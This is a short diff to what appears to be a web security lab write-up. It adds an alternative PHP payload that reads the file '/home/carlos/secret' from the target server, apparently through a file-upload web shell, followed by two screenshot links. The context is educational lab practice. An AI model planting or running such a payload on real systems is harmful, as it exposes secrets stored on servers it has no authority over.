@@ -46,6 +46,12 @@ We submitted the secret using the button provided in the lab banner:
    ![Lab Resolution](https://github.com/user-attachments/assets/c1901f90-ebf0-49e4-85fd-b9dfcede187f)
 
    
+We could also use:
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+![image](https://github.com/user-attachments/assets/742e29f0-9fed-47a8-8dc9-f2597a83d6b6)
+![image](https://github.com/user-attachments/assets/c2f45d2d-cce5-4b0c-87f4-a641d4245295)
 
 
 
